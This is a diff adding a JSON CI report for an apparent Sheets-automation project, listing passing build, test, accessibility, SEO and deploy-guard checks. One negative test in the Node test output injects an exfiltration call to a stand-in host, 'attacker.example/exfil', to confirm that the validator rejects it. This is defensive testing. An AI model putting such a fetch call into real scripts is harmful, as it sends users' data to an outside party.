@@ -1,0 +1,212 @@
+{
+  "generatedAt": "2026-11-14T01:33:44.345Z",
+  "mode": "ci",
+  "overallStatus": "PASS",
+  "totalDurationMs": 31983,
+  "scorecard": [
+    {
+      "criterion": "1. Website Stability & Zero Errors",
+      "status": "PASS",
+      "checks": [
+        "web-build",
+        "vitest-a11y",
+        "playwright-e2e"
+      ],
+      "evidence": "Build: PASS (6 JS chunks, largest 193.26 KB); Vitest/axe: PASS (9 Vitest test(s) passed across 1 file(s)); Playwright: PASS (11 Playwright E2E test(s) passed (0 skipped))"
+    },
+    {
+      "criterion": "2. SEO & GEO + Modern Web Guidance",
+      "status": "PASS",
+      "checks": [
+        "flows-sync",
+        "modern-web-guidance",
+        "playwright-e2e"
+      ],
+      "evidence": "Dist SEO/GEO artifacts: 5/5 present (robots.txt, sitemap.xml, llms.txt, llms-full.txt, og-image.png); Legacy scan: PASS; E2E SEO/GEO: PASS"
+    },
+    {
+      "criterion": "3. GitHub Actions Zero-Error Workflow",
+      "status": "PASS",
+      "checks": [
+        "ci-yaml-and-deploy-dry-run",
+        "node-tests"
+      ],
+      "evidence": "Workflow YAML valid=true; secrets-in-if=0; Node tests: PASS (84/84 tests passed across 3 file(s))"
+    },
+    {
+      "criterion": "4. Flows & Extension Functionality",
+      "status": "PASS",
+      "checks": [
+        "flows-sync",
+        "node-tests",
+        "preflight-guard"
+      ],
+      "evidence": "Flows validated: 12; Extension zip: 58.5 KB; Guard sync: PASS"
+    },
+    {
+      "criterion": "5. Dev/Deploy Accident Guardrails",
+      "status": "PASS",
+      "checks": [
+        "preflight-guard",
+        "ci-yaml-and-deploy-dry-run",
+        "node-tests"
+      ],
+      "evidence": "Preflight (deploy): PASS (4 passed); Deploy dry-run: true"
+    }
+  ],
+  "checks": [
+    {
+      "id": "flows-sync",
+      "name": "Validate Flows, Badges, Manifest, Extension & SEO/GEO Sync",
+      "command": "validate-flows + generate-badges + build-flows-manifest + package-extension + generate-seo-geo-assets",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 1593,
+      "metrics": {
+        "flowCount": 12,
+        "extensionZipKb": 58.5,
+        "seoAssetGeneratorPresent": true
+      },
+      "summary": "12 flows validated & bundled; extension zip 58.5 KB; SEO/GEO assets generated",
+      "outputSnippet": "gmail-invoice-extractor          4        OK       OK       PASS\nhr-offer-letter-onboarding       3        OK       OK       PASS\ninventory-low-stock-alert        4        OK       OK       PASS\nmonthly-ot-sheet-locker          2        OK       OK       PASS\nmulti-item-sales-quote           3        OK       OK       PASS\noverdue-payment-reminder         3        OK       OK       PASS\npacking-slip-dispatch            2        OK       OK       PASS\nweekly-kpi-digest-mailer         3        OK       OK       PASS\n------------------------------------------------------------------------\nTotal flows validated: 12 | Errors: 0\n$ node scripts/generate-badges.mjs\nGenerated 3 badges in web/public/badges:\n  - virustotal.svg: Pending VT_API_KEY (SHA-256 Verified)\n  - ai-security.svg: AI Verified (100%)\n  - flows-count.svg: 12 Ready\n$ node scripts/build-flows-manifest.mjs\nBuilt flows manifest (12 flows):\n  - web/public/flows-manifest.json\n  - extension/flows-bundle.json\n$ node scripts/package-extension.mjs\nPackaged Chrome Extension v1.0.0 (MV3, 11 files, 58.5 KB)\n  - Output: web/public/downloads/sheetautomate-chrome-extension.zip\n  - SHA-256: 282d7b78478726bc1adbcee3dcb163dbdea70a6651267c20f7b1993c3e57b7b0\n$ node scripts/generate-seo-geo-assets.mjs\nSEO/GEO assets synced (12 flows, 7 FAQs, lastmod 2026-11-14). Updated: none (already up to date)"
+    },
+    {
+      "id": "node-tests",
+      "name": "Node Test Suites (tests/*.test.mjs)",
+      "command": "node --test tests/ci-and-guards.test.mjs tests/flows-runtime.test.mjs tests/security-gates.test.mjs",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 2802,
+      "metrics": {
+        "testFiles": 3,
+        "tests": 84,
+        "pass": 84,
+        "fail": 0
+      },
+      "summary": "84/84 tests passed across 3 file(s)",
+      "outputSnippet": "✔ [packing-slip-dispatch] (d) concurrent lock contention exits safely without side effects (0.460245ms)\n✔ [weekly-kpi-digest-mailer] syntax compiles with vm.Script, runtimeVersion is V8, and onOpen registers menu items (0.680576ms)\n✔ [weekly-kpi-digest-mailer] (a) valid row execution with currency/dollar string '$1,250.00' (1.315202ms)\n✔ [weekly-kpi-digest-mailer] (b) duplicate / idempotency guard skips re-emission (0.660093ms)\n✔ [weekly-kpi-digest-mailer] (c) missing required input & blank row handled gracefully (0.534208ms)\n✔ [weekly-kpi-digest-mailer] (d) concurrent lock contention exits safely without side effects (0.419131ms)\n✔ positive: validate-flows.mjs passes on all flows with 0 errors (105.787121ms)\n✔ positive: virustotal-audit.mjs --dry-run exits 0 and is idempotent (436.18482ms)\n✔ positive: ai-security-audit.mjs --dry-run exits 0 and is idempotent (268.859379ms)\n✔ positive: two consecutive runs of build-flows-manifest.mjs exit 0 and produce identical outputs (271.55906ms)\n✔ negative 1: injecting eval('1+1') in Code.gs fails validate-flows.mjs --flows-dir (226.770237ms)\n✔ negative 2: injecting forbidden OAuth scope https://mail.google.com/ fails validate-flows.mjs --flows-dir (207.341243ms)\n✔ negative 3: injecting UrlFetchApp.fetch('https://attacker.example/exfil') fails validate-flows.mjs --flows-dir (246.392872ms)\n✔ negative 4a: removing LockService guard from Code.gs fails validate-flows.mjs --flows-dir (137.919211ms)\n✔ negative 4b: removing onOpen() handler from Code.gs fails validate-flows.mjs --flows-dir (199.578738ms)\n✔ negative 5a: injecting <script> tag in thumbnail.svg fails validate-flows.mjs --flows-dir (219.631443ms)\n✔ negative 5b: injecting emoji character in thumbnail.svg fails validate-flows.mjs --flows-dir (224.463511ms)\nℹ tests 84\nℹ suites 0\nℹ pass 84\nℹ fail 0\nℹ cancelled 0\nℹ skipped 0\nℹ todo 0\nℹ duration_ms 2704.406207"
+    },
+    {
+      "id": "web-build",
+      "name": "Production Build & Code-Split Size Audit",
+      "command": "cd web && npm run build",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 5120,
+      "metrics": {
+        "jsChunkCount": 6,
+        "totalJsKb": 495.72,
+        "largestChunkName": "flows-data-DvYfkVQb.js",
+        "largestChunkKb": 193.26,
+        "oversizedChunks": [],
+        "chunks": [
+          {
+            "name": "flows-data-DvYfkVQb.js",
+            "sizeBytes": 197895,
+            "sizeKb": 193.26
+          },
+          {
+            "name": "vendor-react-CfDz6BDZ.js",
+            "sizeBytes": 142932,
+            "sizeKb": 139.58
+          },
+          {
+            "name": "index-DCAaUzed.js",
+            "sizeBytes": 99305,
+            "sizeKb": 96.98
+          },
+          {
+            "name": "FlowWorkbenchModal-2WuQ2CsB.js",
+            "sizeBytes": 38799,
+            "sizeKb": 37.89
+          },
+          {
+            "name": "vendor-icons-BW4Nmgnx.js",
+            "sizeBytes": 22400,
+            "sizeKb": 21.88
+          },
+          {
+            "name": "LegalModals-DN0_XPyE.js",
+            "sizeBytes": 6283,
+            "sizeKb": 6.14
+          }
+        ]
+      },
+      "summary": "Built 6 JS chunk(s), total 495.72 KB, largest 193.26 KB (0 over 380 KB)",
+      "outputSnippet": "  - ai-security.svg: AI Verified (100%)\n  - flows-count.svg: 12 Ready\nBuilt flows manifest (12 flows):\n  - web/public/flows-manifest.json\n  - extension/flows-bundle.json\nPackaged Chrome Extension v1.0.0 (MV3, 11 files, 58.5 KB)\n  - Output: web/public/downloads/sheetautomate-chrome-extension.zip\n  - SHA-256: 282d7b78478726bc1adbcee3dcb163dbdea70a6651267c20f7b1993c3e57b7b0\nSEO/GEO assets synced (12 flows, 7 FAQs, lastmod 2026-11-14). Updated: none (already up to date)\n> sheetautomate-landing@1.0.0 build\n> tsc && vite build\nvite v6.4.5 building for production...\ntransforming...\n✓ 1654 modules transformed.\nrendering chunks...\ncomputing gzip size...\ndist/index.html                              15.51 kB │ gzip:  4.59 kB\ndist/assets/index-D27GT9gv.css               47.53 kB │ gzip:  8.40 kB\ndist/assets/LegalModals-DN0_XPyE.js           6.28 kB │ gzip:  2.38 kB\ndist/assets/vendor-icons-BW4Nmgnx.js         22.40 kB │ gzip:  4.91 kB\ndist/assets/FlowWorkbenchModal-2WuQ2CsB.js   38.80 kB │ gzip: 10.55 kB\ndist/assets/index-DCAaUzed.js                99.31 kB │ gzip: 20.92 kB\ndist/assets/vendor-react-CfDz6BDZ.js        142.93 kB │ gzip: 45.78 kB\ndist/assets/flows-data-DvYfkVQb.js          197.90 kB │ gzip: 37.10 kB\n✓ built in 1.31s"
+    },
+    {
+      "id": "vitest-a11y",
+      "name": "Vitest Unit & Accessibility (axe-core) Suite",
+      "command": "cd web && npx vitest run",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 7213,
+      "metrics": {
+        "testFiles": 1,
+        "passed": 9,
+        "failed": 0
+      },
+      "summary": "9 Vitest test(s) passed across 1 file(s)",
+      "outputSnippet": "RUN  v5.1.0 /home/hungvu/Pictures/sheetautomate.com/web\n ✓ src/__tests__/catalog-and-workbench.test.tsx (9 tests) 4676ms\n   ✓ SheetAutomate App catalog, workbench, and accessibility (8)\n     ✓ renders all catalog cards, filters by search, and restores all flows on Reset All Filters 684ms\n     ✓ opens FlowWorkbenchModal, syncs ?flow=<slug>, switches tabs via click & arrow keys, runs all 3 simulator scenarios, copies Code.gs/TSV, and closes on Escape 2384ms\n     ✓ opens Privacy Policy and MIT License dialogs from Footer and closes cleanly 385ms\n     ✓ renders RoiCalculator projections and recalculates cleanly without NaN 365ms\n     ✓ has zero serious or critical axe-core accessibility violations on main view and open modal dialog 460ms\n Test Files  1 passed (1)\n      Tests  9 passed (9)\n   Start at  08:33:22\n   Duration  6.11s (tests 78%, import 8%, environment 8%, transform 6%, setup 1%)"
+    },
+    {
+      "id": "modern-web-guidance",
+      "name": "Modern Web Guidance Legacy Scan",
+      "command": "npx --yes modern-web-guidance@latest legacy-scan web",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 2123,
+      "metrics": {
+        "exitCode": 0
+      },
+      "summary": "modern-web-guidance legacy-scan passed cleanly",
+      "outputSnippet": "Modern Web Guidance Analyzer — web\n0 findings from 33 qualified guides.\nNote: legacy-scan covers legacy patterns for 33 guides (~20% of the guidance corpus). Use 'modern-web-guidance search <topic>' for general UI/platform guidance.\nSkipped 3 docs and test files (pass --include-docs-and-tests to scan)."
+    },
+    {
+      "id": "playwright-e2e",
+      "name": "Playwright Headless E2E + SEO/GEO/Stability/Reflow/CLS",
+      "command": "cd web && npx playwright test",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 6509,
+      "metrics": {
+        "specFiles": 1,
+        "passed": 11,
+        "failed": 0,
+        "skipped": 0
+      },
+      "summary": "11 Playwright E2E test(s) passed (0 skipped)",
+      "outputSnippet": "Running 11 tests using 8 workers\n  ✓   2 [chromium] › e2e/site-stability-seo-geo.spec.ts:137:5 › Core Web Vitals & responsive layout reflow › has zero horizontal overflow at 375x812 (965ms)\n  ✓   5 [chromium] › e2e/site-stability-seo-geo.spec.ts:166:3 › Deep-link routing & semantic SEO DOM › pre-filters catalog via ?q=invoice deep link (960ms)\n  ✓   7 [chromium] › e2e/site-stability-seo-geo.spec.ts:137:5 › Core Web Vitals & responsive layout reflow › has zero horizontal overflow at 320x568 (931ms)\n  ✓   9 [chromium] › e2e/site-stability-seo-geo.spec.ts:204:3 › SEO, GEO, and static asset delivery › serves /flows-manifest.json, trust badges, and extension zip with valid payloads (109ms)\n  ✓  11 [chromium] › e2e/site-stability-seo-geo.spec.ts:283:3 › SEO, GEO, and static asset delivery › declares required security headers in public/_headers (9ms)\n  ✓  10 [chromium] › e2e/site-stability-seo-geo.spec.ts:236:3 › SEO, GEO, and static asset delivery › serves /robots.txt, /sitemap.xml, /llms.txt, /llms-full.txt, and /og-image.png for search and AI crawlers (110ms)\n  ✓   6 [chromium] › e2e/site-stability-seo-geo.spec.ts:137:5 › Core Web Vitals & responsive layout reflow › has zero horizontal overflow at 1440x900 (1.1s)\n  ✓   4 [chromium] › e2e/site-stability-seo-geo.spec.ts:174:3 › Deep-link routing & semantic SEO DOM › exposes valid semantic landmarks, single h1/main, and core SEO head metadata (1.1s)\n  ✓   8 [chromium] › e2e/site-stability-seo-geo.spec.ts:155:3 › Deep-link routing & semantic SEO DOM › opens workbench directly via ?flow=b2b-client-invoice deep link (1.1s)\n  ✓   3 [chromium] › e2e/site-stability-seo-geo.spec.ts:107:3 › Core Web Vitals & responsive layout reflow › maintains CLS < 0.1 on initial load (1.9s)\n  ✓   1 [chromium] › e2e/site-stability-seo-geo.spec.ts:11:3 › Site stability, runtime hygiene, and user workflows › renders home, filters catalog, runs workbench simulation, toggles theme, and opens legal modals with zero runtime errors (3.8s)\n  11 passed (5.7s)"
+    },
+    {
+      "id": "preflight-guard",
+      "name": "Preflight Accident Guard (--mode=deploy)",
+      "command": "node scripts/preflight-guard.mjs --mode=deploy",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 371,
+      "metrics": {
+        "guardMode": "deploy",
+        "guardsPassed": 4,
+        "guardsFailed": 0
+      },
+      "summary": "4 preflight guard group(s) passed in deploy mode",
+      "outputSnippet": "Preflight Guard [mode=deploy] target=/home/hungvu/Pictures/sheetautomate.com\n  [PASS] Secret Leak Guard — Scanned 349 workspace entries\n  [PASS] Merge Conflict & Debug Leak Guard — Checked conflict markers, debugger statements, and lockfile placement\n  [PASS] Lockfile & Bundle Sync Guard — 12 flow directories verified against manifest, bundle, lockfile & MV3 scripts\n  [PASS] Deploy Artifact Guard — Verified 13 required artifacts and 6 JS chunks (<= 380 KB each)\nAll preflight guards passed."
+    },
+    {
+      "id": "ci-yaml-and-deploy-dry-run",
+      "name": "GitHub Actions YAML & Deploy Dry-Run Check",
+      "command": "python3 PyYAML check + node scripts/deploy-pages.mjs --dry-run",
+      "status": "PASS",
+      "exitCode": 0,
+      "durationMs": 6231,
+      "metrics": {
+        "yamlValid": true,
+        "deployDryRun": true
+      },
+      "summary": "GitHub Actions YAML validated & deploy-pages.mjs --dry-run READY",
+      "outputSnippet": "> sheetautomate-landing@1.0.0 build\n> tsc && vite build\nvite v6.4.5 building for production...\ntransforming...\n✓ 1654 modules transformed.\nrendering chunks...\ncomputing gzip size...\ndist/index.html                              15.51 kB │ gzip:  4.59 kB\ndist/assets/index-D27GT9gv.css               47.53 kB │ gzip:  8.40 kB\ndist/assets/LegalModals-DN0_XPyE.js           6.28 kB │ gzip:  2.38 kB\ndist/assets/vendor-icons-BW4Nmgnx.js         22.40 kB │ gzip:  4.91 kB\ndist/assets/FlowWorkbenchModal-2WuQ2CsB.js   38.80 kB │ gzip: 10.55 kB\ndist/assets/index-DCAaUzed.js                99.31 kB │ gzip: 20.92 kB\ndist/assets/vendor-react-CfDz6BDZ.js        142.93 kB │ gzip: 45.78 kB\ndist/assets/flows-data-DvYfkVQb.js          197.90 kB │ gzip: 37.10 kB\n✓ built in 1.41s\n==> Step 2/3: Run deploy preflight accident guards\nPreflight Guard [mode=deploy] target=/home/hungvu/Pictures/sheetautomate.com\n  [PASS] Secret Leak Guard — Scanned 349 workspace entries\n  [PASS] Merge Conflict & Debug Leak Guard — Checked conflict markers, debugger statements, and lockfile placement\n  [PASS] Lockfile & Bundle Sync Guard — 12 flow directories verified against manifest, bundle, lockfile & MV3 scripts\n  [PASS] Deploy Artifact Guard — Verified 13 required artifacts and 6 JS chunks (<= 380 KB each)\nAll preflight guards passed.\n==> Step 3/3: Dry-run mode enabled\nREADY: web/dist passed all build and deploy preflight guards. Skipping Wrangler upload."
+    }
+  ]
+}
